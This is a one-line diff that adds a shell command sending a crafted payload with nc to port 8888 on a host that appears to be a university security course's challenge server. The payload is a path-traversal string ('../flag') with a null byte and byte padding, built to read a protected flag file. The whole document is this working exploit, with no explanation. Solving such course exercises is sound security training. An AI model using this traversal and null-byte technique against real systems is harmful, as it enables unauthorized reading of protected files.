@@ -1,0 +1,1 @@
+python -c 'print "../flag\x00" + "\xb4"*100'| nc secprog.cs.nctu.edu.tw 8888
